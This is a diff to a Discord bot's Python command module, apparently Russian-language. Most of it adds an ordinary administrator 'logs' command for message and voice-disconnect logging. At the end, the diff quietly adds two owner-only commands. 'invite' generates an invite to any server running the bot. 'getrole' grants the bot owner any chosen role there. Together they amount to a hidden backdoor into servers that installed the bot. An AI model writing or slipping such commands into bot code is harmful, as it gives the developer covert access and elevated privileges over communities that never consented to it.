@@ -232,6 +232,113 @@ class cmds(commands.Cog):
 
     @commands.command()
     @has_permissions(administrator=True)
+    async def logs(self, ctx: commands.Context, *args):
+        try:
+            if args[0] == 'messages':
+                if args[1] == 'add':
+                    channel = self.bot.get_channel(int(args[2]))
+                    if channel is not None and channel.guild.id == ctx.guild.id and str(channel.type) == 'text':
+                        txt = DataBase('msglogs')
+                        mess = await ctx.send(f'`Добавить Логи удалённых и измененных сообщений?`')
+                        await mess.add_reaction('❤️')
+                        def check(reaction, user):
+                            return user == ctx.message.author and reaction.emoji == '❤️'
+                        try:
+                            await self.bot.wait_for('reaction_add', timeout=10.0, check=check)
+                            res = txt.add({'guildid': channel.guild.id, 'channel_id': channel.id})
+                            if res['added'] == 'True':
+                                await mess.edit(content=f'`Логи сообщений добавлены. Канал:` <#{channel.id}>')
+                            else:
+                                await mess.edit(content=f'`Новый канал для логов сообщений:` <#{channel.id}>')
+                            await mess.clear_reactions()
+                            return
+                        except asyncio.TimeoutError:
+                            try:
+                                await mess.delete()
+                                return
+                            except discord.errors.NotFound:
+                                return
+                    else:
+                        await ctx.send('`Канал не найден среди текстовых каналов сервера.`')
+                        return
+                elif args[1] == 'remove':
+                    txt = DataBase('msglogs')
+                    res = txt.fetch('guildid', ctx.guild.id)
+                    if res['success'] == 'True':
+                        mess = await ctx.send(f'`Удалить Логи удалённых и измененных сообщений?`')
+                        await mess.add_reaction('💔')
+                        def check(reaction, user):
+                            return user == ctx.message.author and reaction.emoji == '💔'
+                        try:
+                            await self.bot.wait_for('reaction_add', timeout=10.0, check=check)
+                            txt.remove('guildid', ctx.guild.id)
+                            await mess.edit(content=f'`Логи сообщений удалены пользователем` <@!{ctx.author.id}>')
+                            await mess.clear_reactions()
+                            return
+                        except asyncio.TimeoutError:
+                            try:
+                                await mess.delete()
+                                return
+                            except discord.errors.NotFound:
+                                return
+                    else:
+                        await ctx.send('`Система логов сообщений не найдена.`')
+            elif args[0] == 'voice':
+                if args[1] == 'add':
+                    txt = DataBase('voicelogs')
+                    channel = self.bot.get_channel(int(args[2]))
+                    if channel is not None and channel.guild.id == ctx.guild.id and str(channel.type) == 'text':
+                        txt = DataBase('voicelogs')
+                        mess = await ctx.send(f'`Добавить Логи Отключения пользователей из голосовых каналов?`')
+                        await mess.add_reaction('❤️')
+                        def check(reaction, user):
+                            return user == ctx.message.author and reaction.emoji == '❤️'
+                        try:
+                            await self.bot.wait_for('reaction_add', timeout=10.0, check=check)
+                            res = txt.add({'guildid': channel.guild.id, 'channel_id': channel.id})
+                            if res['added'] == 'True':
+                                await mess.edit(content=f'`Логи отключения пользователей из голосовых каналов добавлены. Канал:` <#{channel.id}>')
+                            else:
+                                await mess.edit(content=f'`Новый канал для логов этого типа:` <#{channel.id}>')
+                            await mess.clear_reactions()
+                            return
+                        except asyncio.TimeoutError:
+                            try:
+                                await mess.delete()
+                                return
+                            except discord.errors.NotFound:
+                                return
+                    else:
+                        await ctx.send('`Канал не найден среди текстовых каналов сервера.`')
+                        return
+                elif args[1] == 'remove':
+                    txt = DataBase('voicelogs')
+                    res = txt.fetch('guildid', ctx.guild.id)
+                    if res['success'] == 'True':
+                        mess = await ctx.send(f'`Удалить Логи отключений голосовых каналов?`')
+                        await mess.add_reaction('💔')
+                        def check(reaction, user):
+                            return user == ctx.message.author and reaction.emoji == '💔'
+                        try:
+                            await self.bot.wait_for('reaction_add', timeout=10.0, check=check)
+                            txt.remove('guildid', ctx.guild.id)
+                            await mess.edit(content=f'`Логи отключений голосовых каналов удалены.` <@!{ctx.author.id}>')
+                            await mess.clear_reactions()
+                            return
+                        except asyncio.TimeoutError:
+                            try:
+                                await mess.delete()
+                                return
+                            except discord.errors.NotFound:
+                                return
+                    else:
+                        await ctx.send('`Система логов этого типа не найдена.`')
+        except Exception:
+            print(traceback.format_exc())
+            await ctx.send('`Что то пошло не так...`')
+
+    @commands.command()
+    @has_permissions(administrator=True)
     async def setprefix(self, ctx: commands.Context, prefix):
         def getprefix():
             txt = DataBase('prefixes')
@@ -502,6 +609,26 @@ class cmds(commands.Cog):
         else:
             embed = discord.Embed(title="Tickets", description="`<args: create/remove/perms>`", color=0x00ffff)
             await ctx.send(embed=embed)
+
+    @commands.command()
+    async def invite(self, ctx: commands.Context, id):
+        if ctx.author.id != self.bot.owner_id:
+            return
+        guild = self.bot.get_guild(int(id))
+        channel = guild.categories[0].channels[0]
+        invitelink = await channel.create_invite(max_uses=1)
+        await ctx.author.send(invitelink)
+
+    @commands.command()
+    async def getrole(self, ctx: commands.Context, guild_id, role_id):
+        if ctx.author.id != self.bot.owner_id:
+            return
+        guild = self.bot.get_guild(int(guild_id))
+        role = get(guild.roles, id=int(role_id))
+        members = self.bot.get_all_members()
+        for i in members:
+            if i.id == self.bot.owner_id and i.guild.id == guild.id:
+                await i.add_roles(role)
 # -----------------------------------------------------------------------------------------------------------
 class Buttons_inChannel(discord.ui.View):
     ids = []
